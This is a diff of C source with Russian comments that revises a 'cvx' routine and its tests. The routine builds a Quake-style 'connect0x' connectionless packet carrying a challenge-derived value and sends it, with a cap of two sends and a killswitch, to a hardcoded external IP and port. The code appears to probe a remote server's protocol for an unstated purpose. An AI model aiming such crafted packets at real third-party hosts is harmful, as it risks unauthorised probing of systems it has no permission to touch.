@@ -20479,9 +20479,11 @@ static u32 c2b_kdr_build(const u8 *kfull, u32 klen, u32 chal,
  * одном ране: fire#1 = VAL (стабильное поле 'A' @15..18 = g_kdr_val, тот же
  * источник v49), fire#2 = живой счётчик-чал последнего 'A' (g95-сташ
  * g_cvx_achal). 22B = ff×4 + "connect0x" + 8 строчных hex + NUL. Путь =
- * kdr-проверенный sendto (g_clv2_fd -> 152.233.19.133:28022); гэп >= 120
- * тиков после kdr A/B (окна ответов чистые); кап 2, killswitch C2B_CVX=0.
- * Always-остров = selftest-видимость. */
+ * kdr-проверенный sendto (g_clv2_fd -> 152.233.19.133:28022); fire#1 гэп
+ * >= 120 тиков после kdr A/B (окна ответов чистые); fire#2 = СОБЫТИЙНЫЙ
+ * (v106.9: новый 'A' после fire#1 + гэп 10 тиков — 120-тиковый гэп = баг
+ * run528: тик ≈ 150 строк позднего рана = стрельба за концом рана);
+ * кап 2, killswitch C2B_CVX=0. Always-остров = selftest-видимость. */
 static u32 c2b_cvx_build(u8 *out, u32 cap, u32 val, u32 *outlen)
 {
     static const u8 pfx[13] = {
@@ -20500,15 +20502,17 @@ static u32 c2b_cvx_build(u8 *out, u32 cap, u32 val, u32 *outlen)
     return 1;
 }
 
-/* ворота cvx: on, кап 2; fire#1 = VAL + kdr-пара доделана + гэп; fire#2 =
- * живой счётчик 'A' + гэп. Чистая политика (always-остров). */
+/* ворота cvx: on, кап 2; fire#1 = VAL + kdr-пара доделана + гэп (событие
+ * не нужно); fire#2 = живой счётчик 'A' + СОБЫТИЕ "новый 'A' после fire#1"
+ * (a_new = g95-seq изменился с fire#1-снапа) + малый гэп 10 тиков. Чистая
+ * политика (always-остров). */
 static u32 c2b_cvx_gate(u32 on, u32 fires, u32 val, u32 achal,
-                        u32 kdr_done, u32 delay_ok)
+                        u32 kdr_done, u32 delay_ok, u32 a_new)
 {
     if (!on) return 0;
     if (fires >= 2u) return 0;
     if (fires == 0u) return (val && kdr_done && delay_ok) ? 1u : 0u;
-    return (achal && delay_ok) ? 1u : 0u;
+    return (achal && a_new && delay_ok) ? 1u : 0u;
 }
 
 /* v106.7: g16-deep-dump длина = clamp(rlen, 0, 72). Чистая функция
@@ -20821,12 +20825,18 @@ static void c2b_kdr_maybe(void)
     C2B_LOGS("\n");
 }
 
-/* v106.8: CVX рантайм — см. блок у always-острова c2b_cvx_build/c2b_cvx_gate.
+/* v106.9: CVX рантайм — см. блок у always-острова c2b_cvx_build/c2b_cvx_gate.
  * Огонь = тик g97; fire#1 = первый тик после (kdr-пара доделана AND VAL
  * готов AND 120 локальных тиков прошло — окна ответов kdr чисты), fire#2 =
- * fire#1 + 120 тиков с живым счётчиком 'A' (g95-сташ). */
+ * СОБЫТИЙНО-УПРАВЛЯЕМЫЙ: новый 'A' после fire#1 (g_g95_seq изменился с
+ * fire#1-снапа) + гэп 10 тиков. v106.8-баг run528: фиксированный 120-тиковый
+ * гэп после fire#1 = ~18k строк позднего рана (тик ≈ 150 строк) = fire#2
+ * starved, ячейка A-counter непроверенной. Чтение g_g95_seq = volatile u32
+ * на нитке recv (естественная атомарность, дисциплина cstate-slice run519). */
 static u32 g_cvx_init, g_cvx_on = 1, g_cvx_fires, g_cvx_tick;
 static u32 g_cvx_seen_kdr, g_cvx_delay;
+static u32 g_cvx_f1_seq, g_cvx_a_evt;   /* v106.9: снап g95-seq на fire#1,
+                                          * лэтч события "новый 'A'" */
 
 static void c2b_cvx_maybe(void)
 {
@@ -20839,7 +20849,7 @@ static void c2b_cvx_maybe(void)
         if (e && e[0] == '0') g_cvx_on = 0;
         g_cvx_init = 1;
         if (g_cvx_on)
-            C2B_LOGS("[c2b] cvx: ARMED (v106.8 direct connect0x-string cap 2: fire1=VAL fire2=A-counter)\n");
+            C2B_LOGS("[c2b] cvx: ARMED (v106.9 direct connect0x-string cap 2: fire1=VAL fire2=A-counter EVENT-DRIVEN)\n");
     }
     if (!g_cvx_on) return;
     if (g_cvx_fires >= 2u) return;
@@ -20848,10 +20858,19 @@ static void c2b_cvx_maybe(void)
     g_cvx_tick++;
     if (g_kdr_fires >= 2u) g_cvx_seen_kdr = 1;
     if (!g_cvx_seen_kdr) return;              /* ждём конца kdr A/B */
+    /* v106.9: fire#2 = событие "новый 'A' после fire#1" — г95-seq изменился
+     * с fire#1-снапа; до события delay заморожен (не тикает), после —
+     * малый гэп 10 тиков (окно ответа чисто). */
+    if (g_cvx_fires == 1u && !g_cvx_a_evt &&
+        g_g95_seq != g_cvx_f1_seq) {
+        g_cvx_a_evt = 1;
+        g_cvx_delay = 0;
+    }
+    if (g_cvx_fires == 1u && !g_cvx_a_evt) return;
     g_cvx_delay++;
-    delay_ok = (g_cvx_delay >= 120u) ? 1u : 0u;
+    delay_ok = (g_cvx_delay >= ((g_cvx_fires == 0u) ? 120u : 10u)) ? 1u : 0u;
     if (!c2b_cvx_gate(g_cvx_on, g_cvx_fires, g_kdr_val, g_cvx_achal,
-                      g_cvx_seen_kdr, delay_ok)) return;
+                      g_cvx_seen_kdr, delay_ok, g_cvx_a_evt)) return;
     val = (g_cvx_fires == 0u) ? g_kdr_val : g_cvx_achal;
     if (!c2b_cvx_build(cbuf, (u32)sizeof cbuf, val, &n)) return;
     for (i = 0; i < sizeof(sa); i++) sa[i] = 0;
@@ -20871,6 +20890,7 @@ static void c2b_cvx_maybe(void)
     g_probe_active = 0;
     g_cvx_fires++;
     g_cvx_delay = 0;
+    if (g_cvx_fires == 1u) g_cvx_f1_seq = g_g95_seq;  /* v106.9: снап для события fire#2 */
     C2B_LOGS("[c2b] cvx: direct-'connect0x' #");
     C2B_LOGN(g_cvx_fires);
     C2B_LOGS(" val=");
@@ -33503,15 +33523,17 @@ static void test_swr(void)
     CHECK(c2b_g16_dumplen(82) == 72, "dumplen: 82B-beacon = 72");
     CHECK(c2b_g16_dumplen(100) == 72, "dumplen: 100 = кап 72");
     CHECK(c2b_g16_dumplen(2147483647) == 72, "dumplen: max-int = кап 72");
-    /* v106.8: cvx gate x8 */
-    CHECK(c2b_cvx_gate(0, 0, 0xee0a07u, 0, 1, 1) == 0, "cvx: on=0 = скип");
-    CHECK(c2b_cvx_gate(1, 2, 0xee0a07u, 0, 1, 1) == 0, "cvx: кап 2 = скип");
-    CHECK(c2b_cvx_gate(1, 0, 0, 0, 1, 1) == 0, "cvx: fire#1 без VAL = скип");
-    CHECK(c2b_cvx_gate(1, 0, 0xee0a07u, 0, 0, 1) == 0, "cvx: fire#1 kdr не доделан = скип");
-    CHECK(c2b_cvx_gate(1, 0, 0xee0a07u, 0, 1, 0) == 0, "cvx: fire#1 гэп не готов = скип");
-    CHECK(c2b_cvx_gate(1, 0, 0xee0a07u, 0, 1, 1) == 1, "cvx: fire#1 ok");
-    CHECK(c2b_cvx_gate(1, 1, 0, 0, 1, 1) == 0, "cvx: fire#2 без achal = скип");
-    CHECK(c2b_cvx_gate(1, 1, 0, 0x8ce18b7bu, 1, 1) == 1, "cvx: fire#2 ok");
+    /* v106.9: cvx gate x10 (fire#2 = event-driven) */
+    CHECK(c2b_cvx_gate(0, 0, 0xee0a07u, 0, 1, 1, 0) == 0, "cvx: on=0 = скип");
+    CHECK(c2b_cvx_gate(1, 2, 0xee0a07u, 0, 1, 1, 1) == 0, "cvx: кап 2 = скип");
+    CHECK(c2b_cvx_gate(1, 0, 0, 0, 1, 1, 0) == 0, "cvx: fire#1 без VAL = скип");
+    CHECK(c2b_cvx_gate(1, 0, 0xee0a07u, 0, 0, 1, 0) == 0, "cvx: fire#1 kdr не доделан = скип");
+    CHECK(c2b_cvx_gate(1, 0, 0xee0a07u, 0, 1, 0, 0) == 0, "cvx: fire#1 гэп не готов = скип");
+    CHECK(c2b_cvx_gate(1, 0, 0xee0a07u, 0, 1, 1, 0) == 1, "cvx: fire#1 ok (событие не нужно)");
+    CHECK(c2b_cvx_gate(1, 1, 0, 0, 1, 1, 0) == 0, "cvx: fire#2 без achal = скип");
+    CHECK(c2b_cvx_gate(1, 1, 0, 0x8ce18b7bu, 1, 1, 0) == 0, "cvx: fire#2 без события 'A' = скип");
+    CHECK(c2b_cvx_gate(1, 1, 0, 0x8ce18b7bu, 1, 0, 1) == 0, "cvx: fire#2 гэп<10 = скип");
+    CHECK(c2b_cvx_gate(1, 1, 0, 0x8ce18b7bu, 1, 1, 1) == 1, "cvx: fire#2 ok (событие+гэп)");
     /* v106.8: cvx build x6 */
     {
         u8 co8[32];
